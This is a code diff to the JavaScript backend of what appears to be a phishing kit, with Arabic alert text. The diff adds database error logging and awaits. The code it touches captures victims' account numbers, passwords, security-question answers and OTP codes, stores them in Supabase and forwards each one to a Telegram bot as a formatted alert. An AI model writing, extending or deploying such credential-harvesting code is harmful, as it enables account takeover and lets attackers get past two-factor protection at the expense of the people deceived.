@@ -21,7 +21,9 @@ async function addSubmission(type, data) {
     time: new Date().toISOString(),
     data: { ...data }
   };
-  await supabase.from("submissions").insert(entry);
+  const { error } = await supabase.from("submissions").insert(entry);
+  if (error) console.error("[DB] insert error:", error.message);
+  else console.log("[DB] saved submission:", type, entry.id);
   return entry;
 }
 
@@ -163,25 +165,25 @@ function sendJson(res, data) {
   res.end(json);
 }
 
-function detectAndSend(data) {
+async function detectAndSend(data) {
   const s = loadSettings();
   const time = new Date().toLocaleString("ar-EG");
   if (data.password) {
-    addSubmission("login", data);
+    await addSubmission("login", data);
     const msg = `🔐 <b>تسجيل دخول جديد</b>\n\n👤 رقم الحساب: <code>${data.account || ""}</code>\n🔑 كلمة المرور: <code>${data.password || ""}</code>\n📋 الخدمة: ${data.service || "غير محدد"}\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.question || data.answer) {
-    addSubmission("security", data);
+    await addSubmission("security", data);
     const msg = `🛡️ <b>سؤال أمان</b>\n\n❓ السؤال: ${data.question || ""}\n✏️ الجواب: <code>${data.answer || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
   if (data.code || data.otp || data.otp_code) {
-    addSubmission("otp", data);
+    await addSubmission("otp", data);
     const msg = `🔢 <b>رمز OTP</b>\n\n🔑 الرمز: <code>${data.code || data.otp || data.otp_code || ""}</code>\n👤 الحساب: <code>${data.account || ""}</code>\n⏰ ${time}`;
     return sendTelegram(s.bot_token, s.chat_id, msg);
   }
-  return Promise.resolve(true);
+  return true;
 }
 
 function parseCookies(req) {
